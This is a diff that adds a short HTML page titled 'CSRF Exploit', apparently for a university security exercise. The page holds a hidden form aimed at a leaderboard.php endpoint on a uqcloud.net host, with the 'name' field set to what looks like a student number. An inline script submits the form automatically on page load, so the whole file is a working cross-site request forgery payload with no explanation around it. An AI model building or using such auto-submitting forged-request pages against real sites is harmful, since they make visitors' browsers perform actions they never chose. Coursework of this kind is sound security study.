@@ -1,0 +1,13 @@
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <form id="csrfForm" action="https://message.uqcloud.net/leaderboard.php" method="POST">
+        <input type="hidden" name="name" value="43912632">
+        <script>
+            document.getElementById("csrfForm").submit();
+        </script>
+    </form>
+</body>
+</html>
